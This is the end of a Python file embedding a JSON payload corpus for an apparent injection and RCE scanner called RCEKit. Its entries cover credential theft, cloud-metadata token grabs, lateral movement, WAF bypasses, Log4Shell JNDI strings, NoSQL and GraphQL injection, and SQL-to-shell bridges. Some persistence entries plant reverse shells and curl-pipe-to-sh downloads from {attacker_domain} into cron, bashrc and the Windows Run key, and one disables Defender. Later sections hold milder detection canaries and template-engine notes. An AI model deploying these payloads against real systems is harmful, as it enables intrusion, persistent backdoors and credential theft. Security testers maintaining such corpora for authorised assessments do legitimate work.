        "dir C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials",
        "reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
        "findstr /si password *.txt *.config *.ini",
        "type %USERPROFILE%\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials\\\\* 2>nul"
      ],
      "php": [
        "$config = include 'config.php'; var_dump($config);",
        "echo file_get_contents(__DIR__ . '/.env');",
        "echo file_get_contents('/var/www/html/config/database.php');"
      ],
      "python": [
        "import os; print(os.environ.get('AWS_SECRET_ACCESS_KEY'))",
        "from pathlib import Path; print(Path.home().joinpath('.aws','credentials').read_text())",
        "import keyring; print(keyring.get_keyring())"
      ]
    },
    "privilege_escalation": {
      "unix": [
        "sudo -l",
        "cat /etc/sudoers",
        "find / -perm -4000 -type f 2>/dev/null",
        "getcap -r / 2>/dev/null",
        "grep -R 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null"
      ],
      "windows": [
        "whoami /priv",
        "whoami /groups",
        "icacls C:\\\\Windows\\\\System32\\\\cmd.exe",
        "wmic qfe get Caption,Description,HotFixID,InstalledOn",
        "powershell -Command \"Get-Service | Where-Object {$_.Status -eq 'Running' -and $_.StartType -eq 'Auto'}\""
      ],
      "docker": [
        "cat /proc/self/cgroup",
        "ls -l /host 2>/dev/null",
        "find / -maxdepth 2 -name docker.sock 2>/dev/null"
      ],
      "kubernetes": [
        "kubectl auth can-i * *",
        "kubectl describe clusterrolebinding",
        "kubectl get pods -A -o wide"
      ]
    },
    "persistence": {
      "unix": [
        "echo '@reboot /usr/bin/curl http://{attacker_domain}/shell.sh | sh' | crontab -",
        "echo '*/5 * * * * /usr/bin/wget http://{attacker_domain}/payload.sh -O /tmp/payload.sh && sh /tmp/payload.sh' >> /etc/crontab",
        "echo 'bash -i >& /dev/tcp/{attacker_ip}/443 0>&1' >> ~/.bashrc",
        "mkdir -p ~/.config/systemd/user; echo -e '[Service]\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/{attacker_ip}/443 0>&1\"\n[Install]\nWantedBy=default.target' > ~/.config/systemd/user/update.service",
        "echo '*/10 * * * * root /usr/bin/python3 -c \"import urllib.request; exec(urllib.request.urlopen(\\'http://{attacker_domain}/s.py\\').read())\"' >> /etc/cron.d/system"
      ],
      "windows": [
        "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Updater /t REG_SZ /d C:\\\\Windows\\\\Temp\\\\backdoor.exe /f",
        "schtasks /Create /SC ONLOGON /TN Updater /TR \\\"powershell.exe -ExecutionPolicy Bypass -File %TEMP%\\\\backdoor.ps1\\\" /F",
        "powershell -Command \"New-ItemProperty -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name Sync -Value 'powershell -nop -w hidden -c Invoke-WebRequest http://{attacker_domain}/sync.ps1 -OutFile $env:TEMP\\\\sync.ps1; & $env:TEMP\\\\sync.ps1'\"",
        "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
        "copy %SystemRoot%\\\\System32\\\\cmd.exe %APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\update.exe"
      ]
    },
    "cloud_metadata": {
      "unix": [
        "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "wget -q -O- http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata:true'",
        "aws sts get-caller-identity",
        "curl http://100.100.100.200/latest/meta-data/ram/security-credentials/"
      ],
      "windows": [
        "powershell -Command \"Invoke-WebRequest -Headers @{'Metadata-Flavor'='Google'} -Uri http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\"",
        "powershell -Command \"Invoke-RestMethod -Headers @{Metadata='true'} -Uri http://169.254.169.254/metadata/instance?api-version=2021-02-01\"",
        "powershell -Command \"Invoke-WebRequest -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
        "powershell -Command \"Invoke-RestMethod -Uri http://100.100.100.200/latest/meta-data/ram/security-credentials/\""
      ],
      "docker": [
        "curl --connect-timeout 1 http://169.254.169.254/latest/meta-data/",
        "ip route",
        "nsenter --target 1 --mount --uts --ipc --net --pid curl http://169.254.169.254/latest/meta-data/"
      ],
      "kubernetes": [
        "kubectl get secrets -n kube-system aws-auth -o yaml",
        "curl -k -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' https://kubernetes.default.svc/api",
        "kubectl get configmap -n kube-system cluster-info -o yaml"
      ]
    },
    "database_enumeration": {
      "unix": [
        "mysql -e \"SHOW DATABASES;\"",
        "psql -c \"SELECT table_schema,table_name FROM information_schema.tables LIMIT 10;\"",
        "mongo --quiet --eval \"db.adminCommand({listDatabases:1})\"",
        "sqlite3 /etc/passwd \"SELECT * FROM sqlite_master;\"",
        "redis-cli INFO"
      ],
      "windows": [
        "sqlcmd -Q \"SELECT name FROM sys.databases\"",
        "powershell -Command \"Invoke-Sqlcmd -Query \"\"SELECT name FROM master..sysdatabases\"\"\"",
        "wmic path win32_service get Name,PathName | findstr /i sql"
      ],
      "php": [
        "$pdo = new PDO('mysql:host=127.0.0.1', 'root', ''); foreach($pdo->query('SHOW DATABASES') as $row){echo $row[0] . \"\\n\";}",
        "echo mysqli_get_host_info(mysqli_connect('127.0.0.1', 'root', ''));",
        "$db = new PDO('sqlite:/var/www/html/database.sqlite'); foreach($db->query('SELECT name FROM sqlite_master') as $row){echo $row['name'];}"
      ],
      "python": [
        "import sqlite3; [print(row) for row in sqlite3.connect('app.db').execute(\"SELECT name FROM sqlite_master WHERE type='table'\")]",
        "import pymongo; client = pymongo.MongoClient('mongodb://127.0.0.1:27017'); print(client.list_database_names())",
        "import mysql.connector; conn = mysql.connector.connect(user='root',password='',host='127.0.0.1'); cursor = conn.cursor(); cursor.execute('SHOW DATABASES'); print(cursor.fetchall())"
      ]
    },
    "lateral_movement": {
      "unix": [
        "ssh -oStrictHostKeyChecking=no user@{attacker_ip}",
        "for host in $(cut -d' ' -f1 /etc/hosts); do ssh -oBatchMode=yes $host uptime; done",
        "scp /etc/passwd {attacker_ip}:/tmp/passwd_copy",
        "ansible all -i {attacker_ip}, -m shell -a 'whoami'",
        "rsh {attacker_ip} whoami"
      ],
      "windows": [
        "wmic /node:{attacker_ip} process call create 'cmd.exe /c whoami'",
        "psexec \\\\{attacker_ip} cmd.exe /c whoami",
        "winrs -r:{attacker_ip} cmd",
        "powershell -Command \"Invoke-Command -ComputerName {attacker_ip} -ScriptBlock { whoami }\"",
        "net use \\\\{attacker_ip}\\\\C$"
      ]
    },
    "waf_bypass": {
      "unix": [
        "cat${IFS}/etc/passwd",
        "cat$IFS/etc/passwd",
        "cat${IFS%??}/etc/passwd",
        "{cat,/etc/passwd}",
        "cat</etc/passwd",
        "who$@ami",
        "uname${IFS}-a",
        "i\\d"
      ],
      "windows": [
        "who^ami",
        "wh^o^ami",
        "type%09C:\\Windows\\win.ini",
        "cmd /c who^ami"
      ]
    },
    "oob": {
      "unix": [
        "curl http://{oob}/",
        "wget -qO- http://{oob}/",
        "nslookup {oob}",
        "ping -c 1 {oob}",
        "dig {oob}",
        "curl http://{oob}/$(whoami)",
        "curl http://$(whoami).{oob}/"
      ],
      "windows": [
        "nslookup {oob}",
        "powershell -c \"Invoke-WebRequest -UseBasicParsing http://{oob}/\"",
        "powershell -c \"Resolve-DnsName {oob}\"",
        "certutil -urlcache -f http://{oob}/ %TEMP%\\x",
        "cmd /c nslookup %USERNAME%.{oob}"
      ],
      "java": [
        "${jndi:ldap://{oob}/a}",
        "${jndi:dns://{oob}/a}",
        "${jndi:rmi://{oob}/a}"
      ]
    },
    "nosql_injection": {
      "mongodb": {
        "operator_injection": [
          "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
          "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
          "{\"username\": \"admin\", \"password\": {\"$regex\": \"^.*\"}}",
          "username[$ne]=admin&password[$ne]=x",
          "{\"$or\": [{}, {\"x\": \"y\"}], \"username\": \"admin\"}"
        ],
        "where_js": [
          "{\"$where\": \"return true\"}",
          "{\"$where\": \"this.password == this.username\"}",
          "{\"$where\": \"sleep(5000)\"}",
          "admin' || '1'=='1",
          "'; return true; var x='"
        ],
        "server_side_js": [
          "{\"$expr\": {\"$function\": {\"body\": \"function(){return true}\", \"args\": [], \"lang\": \"js\"}}}",
          "{\"$expr\": {\"$function\": {\"body\": \"function(){return sleep(5000)}\", \"args\": [], \"lang\": \"js\"}}}",
          "{\"$accumulator\": {\"init\": \"function(){return sleep(5000)}\", \"accumulate\": \"function(){}\", \"accumulateArgs\": [], \"merge\": \"function(){}\", \"lang\": \"js\"}}"
        ]
      }
    },
    "graphql_injection": {
      "graphql": {
        "introspection": [
          "{__schema{types{name}}}",
          "{__schema{queryType{name} mutationType{name} types{name fields{name}}}}",
          "{__type(name:\"User\"){name fields{name type{name kind}}}}",
          "query{__typename}"
        ],
        "injection": [
          "{ user(id: \"1; id\") { name } }",
          "{ user(id: \"1' OR '1'='1-- \") { name } }",
          "{ search(q: \"$(id)\") { id } }",
          "{ file(path: \"../../../../etc/passwd\") { content } }",
          "{ user(id: \"1${IFS}||${IFS}id\") { name } }"
        ],
        "batching": [
          "{ a: user(id:\"1\"){name} b: user(id:\"2\"){name} c: user(id:\"3\"){name} }",
          "query { a { b { c { d { e } } } } }"
        ]
      }
    }
  },
  "detection_payloads": {
    "unix": [
      "echo DETECTION_{canary}",
      "sleep 5",
      "printf 'canary:%s' $(hostname)",
      "command -v whoami && echo HEALTH_{canary}",
      "printf 'det:%s' $(id -u)",
      "curl http://{oob}/",
      "nslookup {oob}"
    ],
    "windows": [
      "echo DETECTION_{canary}",
      "timeout /T 5",
      "powershell -Command \"Start-Sleep -Seconds 3; Write-Output 'DETECTION_{canary}'\"",
      "for /f \"tokens=2 delims==\" %i in (\"%TIME%\") do @echo DETECTION_{canary}:%i",
      "powershell -Command \"[Console]::WriteLine('det-{canary}')\"",
      "nslookup {oob}"
    ],
    "php": [
      "echo 'DETECTION_{canary}';",
      "error_log('DETECTION_{canary}');",
      "var_dump('DETECTION_{canary}');"
    ],
    "python": [
      "print('DETECTION_{canary}')",
      "import time; time.sleep(2)",
      "import os; print(f'detect:{canary}:{os.getpid()}')",
      "__import__('time').sleep(1)"
    ],
    "nodejs": [
      "console.log('DETECTION_{canary}')",
      "setTimeout(()=>console.log('timer {canary}'), 1000)",
      "process.stdout.write('detect-{canary}')",
      "setImmediate(()=>console.log('det:{canary}'))"
    ],
    "java": [
      "System.out.println(\"DETECTION_{canary}\");",
      "Thread.sleep(2000);",
      "System.err.println(\"DETECTION_{canary}\");",
      "System.out.printf(\"det:%s\\n\", \"{canary}\");"
    ],
    "dotnet": [
      "Console.WriteLine(\"DETECTION_{canary}\");",
      "System.Threading.Thread.Sleep(2000);",
      "Console.Error.WriteLine(\"det-{canary}\");"
    ],
    "docker": [
      "echo 'detector:{canary}'",
      "sleep 2",
      "cat /proc/1/cgroup | head -n 5"
    ],
    "kubernetes": [
      "kubectl get pods --namespace default",
      "echo 'kube-detect-{canary}'",
      "kubectl cluster-info"
    ],
    "ruby": [
      "puts 'DETECTION_{canary}'",
      "sleep 1"
    ],
    "perl": [
      "print \"DETECTION_{canary}\\n\";",
      "select(undef, undef, undef, 1);"
    ],
    "go": [
      "fmt.Println(\"DETECTION_{canary}\")",
      "time.Sleep(1 * time.Second)"
    ],
    "sql": [
      "SELECT 'DETECTION_{canary}';",
      "SELECT pg_sleep(1);"
    ],
    "powershell": [
      "Write-Output \"DETECTION_{canary}\"",
      "Start-Sleep -Milliseconds 500"
    ]
  },
  "eval_carriers": {
    "freemarker": {
      "engines": [
        "freemarker"
      ],
      "template": "${(__EXPR__)?c}",
      "notes": "Freemarker renders a bare ${a*b} with the locale's grouping separators (2,070,761,401), so the raw product RCEKit searches for is absent and a genuinely evaluating target reads as negative. ?c is the computer number format and yields the bare digits.",
      "verified": "freemarker 2.3.32: ${a*b} -> '2,070,761,401' (product NOT found); ${(a*b)?c} -> '2070761401' (found)"
    },
    "velocity": {
      "engines": [
        "velocity"
      ],
      "template": "#set($rk=__EXPR__)$rk",
      "notes": "In Velocity ${a*b} is a reference, not an expression, so it is not evaluated at all and passes through literally. Arithmetic needs a #set directive.",
      "verified": "velocity-engine-core 2.3: ${a*b} -> literal '${a*b}'; #set($x=a*b)$x -> '2070761401'"
    },
    "thymeleaf": {
      "engines": [
        "thymeleaf"
      ],
      "template": "[[${__EXPR__}]]",
      "notes": "Thymeleaf only evaluates an expression inside its inlining brackets; a bare ${a*b} in template text is emitted verbatim.",
      "verified": "thymeleaf 3.1.2: ${a*b} -> literal '${a*b}'; [[${a*b}]] -> '2070761401'. The __${...}__ preprocessing form was also tried and did NOT evaluate standalone, so it is deliberately not shipped."
    },
    "liquid": {
      "engines": [
        "liquid",
        "shopify",
        "jekyll"
      ],
      "template": "{{ __A__ | times: __B__ }}",
      "notes": "Liquid has no arithmetic operators, so every bare form RCEKit sends passes through untouched and an evaluating target reads as negative -- {{a*b}} is not even parsed, it raises 'expected \"|\" before filter'. Multiplication is a filter, which needs the operands apart rather than the joined expression.",
      "verified": "liquid 5.14.0 on ruby 3.3.12 (the reference implementation, which is what Shopify and Jekyll run): every bare form missing, {{ 45013 | times: 45989 }} -> '2070102857'. liquidjs 10.29.0 agrees: every bare form missing (raw/${}/{{}}/#{}/%{}/<%= %>/@()), filter form -> '2070102857'; the {% assign %} form also works and the filter form is shipped as it is one output tag."
    },
    "django": {
      "engines": [
        "django"
      ],
      "template": "{% widthratio __A__ 1 __B__ %}",
      "notes": "Django's template language deliberately has no arithmetic: {{a*b}} is a TemplateSyntaxError, not an evaluation, and every other bare form passes through as text. widthratio computes this/max*width, so with a max of 1 it multiplies -- the operands are three separate tag arguments and cannot be written as one expression.",
      "verified": "Django 6.1.1: every bare form missing ({{a*b}} raised TemplateSyntaxError \"Could not parse the remainder\"); {% widthratio 45013 1 45989 %} -> '2070102857' (found)"
    }
  },
  "bridges": {
    "postgres_copy_program": {
      "engines": [
        "postgresql"
      ],
      "sink_env": "unix",
      "safety": "stateful",
      "requires": [
        "superuser, or a role in pg_execute_server_program"
      ],
      "template": "DROP TABLE IF EXISTS rk_{token}; CREATE TABLE rk_{token}(o text); COPY rk_{token} FROM PROGRAM '__CMD__'; SELECT o FROM rk_{token};",
      "cleanup": "DROP TABLE IF EXISTS rk_{token};",
      "notes": "COPY FROM PROGRAM runs its argument through /bin/sh on the database server, so a Unix command core rides it unchanged. It creates a table, which is why this bridge is stateful and carries its own DROP. The leading DROP IF EXISTS is not tidiness: the timing oracle fires the same bridge twice against one table name (0s then Ns), and without it the second CREATE fails, the statement aborts and the delay never happens -- the regression would then read as no delay on a target that is executing. The SELECT is there for the case where the driver returns the last result set to the application; do not rely on it. The reliable oracles here are time (the COPY blocks until the program exits) and oob (the program itself calls back), and both work with nothing rendered.",
      "verified": "not validated against a live PostgreSQL here (no container runtime in the build environment); the syntax is PostgreSQL 9.3+ documented behaviour"
    },
    "mssql_xp_cmdshell": {
      "engines": [
        "mssql"
      ],
      "sink_env": "windows",
      "safety": "intrusive",
      "requires": [
        "sysadmin, and xp_cmdshell enabled"
      ],
      "template": "EXEC master..xp_cmdshell '__CMD__';",
      "cleanup": null,
      "notes": "xp_cmdshell hands its argument to cmd.exe, so the command core must be the cmd.exe dialect -- a POSIX $((a+b)) is inert text there. Creates nothing, so there is nothing to clean up; it is intrusive rather than stateful because it executes a command, not because it leaves an object behind.",
      "verified": "not validated against a live SQL Server here; documented behaviour of xp_cmdshell"
    },
    "xxe_expect": {
      "engines": [
        "php"
      ],
      "sink_env": "unix",
      "safety": "intrusive",
      "requires": [
        "PHP with the expect extension loaded, and an XML parser with external entities enabled"
      ],
      "template": "<?xml version=\"1.0\"?><!DOCTYPE rk [<!ENTITY rk SYSTEM \"expect://__CMD__\">]><rk>&rk;</rk>",
      "cleanup": null,
      "notes": "The expect:// stream wrapper executes its URI through a shell and yields the output as the entity's value, so a document that renders the entity returns the command output directly. The extension is rarely installed, which is exactly why this is opt-in rather than part of a default run.",
      "verified": "not validated here; documented behaviour of the PHP expect stream wrapper"
    }
  },
  "deser_probes": {
    "java": {
      "label": "Java ObjectInputStream",
      "wellformed": "rO0ABXQABHJjZWs=",
      "truncated": "rO0ABXQABA==",
      "magic": "rO0AB",
      "dns": "java_urldns",
      "notes": "A base64 java.io serialization stream carrying a single String -- no class outside java.lang, so nothing in it can run. The truncated form is the same stream cut short, which a real ObjectInputStream rejects with a stream-corruption error while a parameter that is merely stored treats both as opaque text. The DNS shape is built in Python rather than declared here because the URL host is length-prefixed inside the stream and changes per probe.",
      "verified": "OpenJDK 21: the generated URLDNS stream deserializes to HashMap{http://<host>/=rk} and issues a DNS query for <host>, with no code execution"
    },
    "php": {
      "label": "PHP unserialize()",
      "wellformed": "O:8:\"stdClass\":0:{}",
      "truncated": "O:8:\"stdClass\":0:",
      "magic": "O:8:\"stdClass\":",
      "dns": null,
      "notes": "stdClass has no magic methods, so unserialize() on this builds an empty object and runs nothing. PHP has no non-executing DNS gadget of the URLDNS kind -- every known chain goes through __wakeup/__destruct -- so only the error-shape oracle applies here.",
      "verified": "documented PHP serialization format; not exercised against a live PHP endpoint in this environment"
    },
    "dotnet": {
      "label": ".NET BinaryFormatter",
      "wellformed": "AAEAAAD/////AQAAAAAAAAAGAQAAAAJyawtd",
      "truncated": "AAEAAAD/////AQAAAAAAAAAG",
      "magic": "AAEAAAD/////",
      "dns": null,
      "notes": "The BinaryFormatter header plus a single string record. Only the error-shape oracle applies: .NET's non-executing gadgets are type-confusion chains rather than a DNS side effect.",
      "verified": "documented BinaryFormatter record layout; not exercised against a live .NET endpoint in this environment"
    },
    "python_pickle": {
      "label": "Python pickle",
      "wellformed": "gASVBgAAAAAAAACMAnJrlC4=",
      "truncated": "gASVBgAAAAAAAACM",
      "magic": "gASV",
      "dns": null,
      "notes": "A protocol-4 pickle of the string 'rk'. It contains no GLOBAL or REDUCE opcode, so loading it constructs a string and calls nothing. Only the error-shape oracle applies.",
      "verified": "round-trips through pickle.loads in this environment"
    },
    "fastjson": {
      "label": "fastjson / Jackson polymorphic JSON",
      "wellformed": "{\"@type\":\"java.lang.String\",\"val\":\"rk\"}",
      "truncated": "{\"@type\":\"java.lang.String\",\"val\":",
      "magic": "{\"@type\":",
      "dns": "{\"rk\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"{host}\"}}",
      "notes": "Polymorphic deserialization by type name. java.net.Inet4Address resolves its val on construction, which is a DNS side effect and not code execution -- the same honest signal URLDNS gives for the binary format, expressible as plain text because JSON is not length-prefixed.",
      "verified": "documented fastjson autotype behaviour; not exercised against a live fastjson endpoint in this environment"
    }
  },
  "eval_carrier_survey": {
    "purpose": "Engines measured against RCEKit's bare eval forms. A carrier exists only for a measured false negative; these are the results that did not produce one, recorded so the survey is not repeated.",
    "bare_form_sufficient": {
      "nunjucks 3.2.4": "{{a*b}} -> '2070102857'",
      "tornado 6.5.10": "{{a*b}} -> '2070102857'",
      "mako 1.4.1": "${a*b} -> '2070102857'",
      "chameleon 4.6.0": "${a*b} -> '2070102857'",
      "smarty 5.8.4": "${a*b} -> '$2070102857' and {{a*b}} -> '2070102857' (Smarty evaluates arithmetic inside its own braces, so the bare forms already carry the product)",
      "erb (ruby 3.3.12)": "<%= a*b %> -> '2070102857'"
    },
    "out_of_reach": {
      "handlebars 4.7.9": "Every bare form missing ({{a*b}} is a parse error), and handlebars is logic-less with no built-in arithmetic helper, so there is no template text that computes a product without a helper the application itself registered. No carrier can be written; an evaluating handlebars target is not reachable by this oracle.",
      "go text/template 1.23.12": "Every bare form missing ({{a*b}} is 'unexpected \"*\" in operand'). Go's template language has no arithmetic operator and no multiplying builtin -- mul comes from sprig, which the application itself must register. The only forms that produced the product were {{printf \"%d\" <product>}} and {{<product>}}, and both hand the target the answer, so an echoing target would read as confirmed. A carrier that carries its own result is not a carrier; an evaluating Go target is not reachable by this oracle."
    }
  }
}
"""
# --- END EMBEDDED PAYLOAD CORPUS ---

if __name__ == "__main__":
    raise SystemExit(main())
